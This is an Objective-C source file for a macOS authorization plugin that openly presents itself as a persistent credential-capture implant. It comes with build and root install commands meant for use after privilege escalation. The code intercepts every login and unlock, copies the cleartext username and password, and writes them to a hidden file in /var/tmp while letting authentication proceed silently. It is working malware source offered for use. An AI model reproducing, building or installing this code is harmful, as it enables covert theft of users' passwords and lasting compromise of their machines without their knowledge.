/*
 * Authorization Plugin — Persistent Credential Capture
 * Hooks into macOS login/unlock to capture cleartext passwords.
 * Installs as a Security Agent Plugin.
 *
 * REQUIRES ROOT to install. Use after initial privesc.
 *
 * MITRE: T1556 (Modify Authentication Process)
 * Ref: https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65
 *
 * Build:
 *   clang -bundle -framework Security -framework Foundation \
 *     -o AuthPlugin.bundle/Contents/MacOS/AuthPlugin auth_plugin.m
 *
 * Install:
 *   sudo cp -r AuthPlugin.bundle /Library/Security/SecurityAgentPlugins/
 *   sudo security authorizationdb write system.login.console < auth_rule.plist
 */

#import <Foundation/Foundation.h>
#import <Security/AuthorizationPlugin.h>
#import <Security/AuthorizationDB.h>

#define LOG_PATH "/var/tmp/.auth_creds"

// ============================================================
// Plugin State
// ============================================================

typedef struct {
    const AuthorizationCallbacks *callbacks;
    AuthorizationEngineRef engine;
} PluginState;

typedef struct {
    PluginState *plugin;
    AuthorizationEngineRef engine;
} MechanismState;

// ============================================================
// Credential Extraction
// ============================================================

static void extractAndLogCredentials(MechanismState *mech) {
    AuthorizationContextFlags flags;
    const AuthorizationValue *value;
    
    // Extract username
    NSString *username = @"unknown";
    OSStatus status = mech->plugin->callbacks->GetContextValue(
        mech->engine,
        kAuthorizationEnvironmentUsername,
        &flags,
        &value
    );
    if (status == errAuthorizationSuccess && value->length > 0) {
        username = [[NSString alloc] initWithBytes:value->data
                                            length:value->length - 1
                                          encoding:NSUTF8StringEncoding];
    }
    
    // Extract password — the gold
    NSString *password = @"";
    status = mech->plugin->callbacks->GetContextValue(
        mech->engine,
        kAuthorizationEnvironmentPassword,
        &flags,
        &value
    );
    if (status == errAuthorizationSuccess && value->length > 0) {
        password = [[NSString alloc] initWithBytes:value->data
                                            length:value->length - 1
                                          encoding:NSUTF8StringEncoding];
    }
    
    // Log credentials
    if (password.length > 0) {
        NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
        [fmt setDateFormat:@"yyyy-MM-dd'T'HH:mm:ss'Z'"];
        [fmt setTimeZone:[NSTimeZone timeZoneWithName:@"UTC"]];
        NSString *ts = [fmt stringFromDate:[NSDate date]];
        
        NSString *entry = [NSString stringWithFormat:@"%@|%@|%@|auth_plugin\n",
                          ts, username, password];
        
        NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:@LOG_PATH];
        if (!fh) {
            [[NSFileManager defaultManager] createFileAtPath:@LOG_PATH
                                                    contents:nil
                                                  attributes:@{
                NSFilePosixPermissions: @0600
            }];
            fh = [NSFileHandle fileHandleForWritingAtPath:@LOG_PATH];
        }
        [fh seekToEndOfFile];
        [fh writeData:[entry dataUsingEncoding:NSUTF8StringEncoding]];
        [fh closeFile];
    }
}

// ============================================================
// Plugin Lifecycle Callbacks
// ============================================================

static OSStatus pluginCreate(
    const AuthorizationCallbacks *callbacks,
    AuthorizationPluginRef *outPlugin,
    const AuthorizationPluginInterface **outInterface
);

static OSStatus pluginDestroy(AuthorizationPluginRef plugin);

static OSStatus mechCreate(
    AuthorizationPluginRef plugin,
    AuthorizationEngineRef engine,
    AuthorizationMechanismId mechanismId,
    AuthorizationMechanismRef *outMechanism
);

static OSStatus mechInvoke(AuthorizationMechanismRef mechanism);
static OSStatus mechDeactivate(AuthorizationMechanismRef mechanism);
static OSStatus mechDestroy(AuthorizationMechanismRef mechanism);

// ============================================================
// Interface Implementation
// ============================================================

static AuthorizationPluginInterface pluginInterface = {
    kAuthorizationPluginInterfaceVersion,
    &pluginDestroy,
    &mechCreate,
    &mechInvoke,
    &mechDeactivate,
    &mechDestroy
};

static OSStatus pluginCreate(
    const AuthorizationCallbacks *callbacks,
    AuthorizationPluginRef *outPlugin,
    const AuthorizationPluginInterface **outInterface
) {
    PluginState *state = (PluginState *)calloc(1, sizeof(PluginState));
    if (!state) return errAuthorizationInternal;
    
    state->callbacks = callbacks;
    *outPlugin = (AuthorizationPluginRef)state;
    *outInterface = &pluginInterface;
    
    return errAuthorizationSuccess;
}

static OSStatus pluginDestroy(AuthorizationPluginRef plugin) {
    free(plugin);
    return errAuthorizationSuccess;
}

static OSStatus mechCreate(
    AuthorizationPluginRef plugin,
    AuthorizationEngineRef engine,
    AuthorizationMechanismId mechanismId,
    AuthorizationMechanismRef *outMechanism
) {
    MechanismState *mech = (MechanismState *)calloc(1, sizeof(MechanismState));
    if (!mech) return errAuthorizationInternal;
    
    mech->plugin = (PluginState *)plugin;
    mech->engine = engine;
    *outMechanism = (AuthorizationMechanismRef)mech;
    
    return errAuthorizationSuccess;
}

static OSStatus mechInvoke(AuthorizationMechanismRef mechanism) {
    MechanismState *mech = (MechanismState *)mechanism;
    
    // Extract credentials before passing through
    extractAndLogCredentials(mech);
    
    // Allow authentication to proceed normally
    return mech->plugin->callbacks->SetResult(mech->engine, kAuthorizationResultAllow);
}

static OSStatus mechDeactivate(AuthorizationMechanismRef mechanism) {
    MechanismState *mech = (MechanismState *)mechanism;
    return mech->plugin->callbacks->DidDeactivate(mech->engine);
}

static OSStatus mechDestroy(AuthorizationMechanismRef mechanism) {
    free(mechanism);
    return errAuthorizationSuccess;
}

// ============================================================
// Entry Point — Required by Authorization Plugin API
// ============================================================

OSStatus AuthorizationPluginCreate(
    const AuthorizationCallbacks *callbacks,
    AuthorizationPluginRef *outPlugin,
    const AuthorizationPluginInterface **outInterface
) {
    return pluginCreate(callbacks, outPlugin, outInterface);
}
